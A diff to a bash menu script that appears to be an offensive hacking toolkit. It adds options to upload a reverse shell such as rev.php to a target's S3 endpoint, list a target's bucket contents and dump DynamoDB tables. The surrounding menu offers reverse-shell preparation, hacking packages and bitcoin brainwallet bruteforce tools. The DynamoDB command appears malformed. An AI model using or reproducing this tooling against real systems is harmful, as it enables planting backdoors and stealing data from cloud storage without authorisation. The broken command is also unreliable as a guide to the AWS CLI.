@@ -963,6 +963,7 @@ while true; do
 	echo -ne " 2261. Encrypt and Encode a file to pass in remote host\t\t\t\t\t\t\t2267. install a python hacking package\n"
 	echo -ne " 2268. install a python3 hacking package\t2289. install a ruby hacking gem\t\t\t\tPrepare RevShell for Windows\n"
 	echo -ne " 2337. install a deb package\t\t\t2338. install a browser\t\t\t\t\t2353. Pull a Docker image\n"
+	echo -ne " 2452. AWS S3 copy file to remote host\t\t\t2453. AWS S3 list file in remote host\t\t\t2454. AWS S3 dump dynamodb tables\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -9832,6 +9833,42 @@ while true; do
 	;;
 	"2451")
 		Clona "google/security-research"
+	;;
+	"2452")
+		echo "Digit the target Url"
+		read -p "(example, https://s3.domain.com): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit a reverse shell to upload"
+			read -e -p "(example, rev.php): " RVSH
+			if [[ -f "$RVSH" ]];
+			then
+				echo "Digit a the only remote destionation path without protocol and without the final file name"
+				read -p "(example, advserver/): " SDST
+				if [[ "$SDST" != "" ]];
+				then
+					aws --endpoint-url "$TIP" s3 cp "$RVSH" "s3://""$SDST"
+				fi
+			fi
+		fi
+	;;
+	"2453")
+		echo "Digit the target Url"
+		read -p "(example, https://s3.domain.com): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit a target folder, empty for root folder"
+			read -p "(example, adserver): " FLDR
+			aws --endpoint-url "$TIP" s3 ls "$FLDR"
+		fi
+	;;
+	"2454")
+		echo "Digit the target Url"
+		read -p "(example, https://s3.domain.com): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			aws --endpoint-url "$TIP" dynamodb --table-names
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
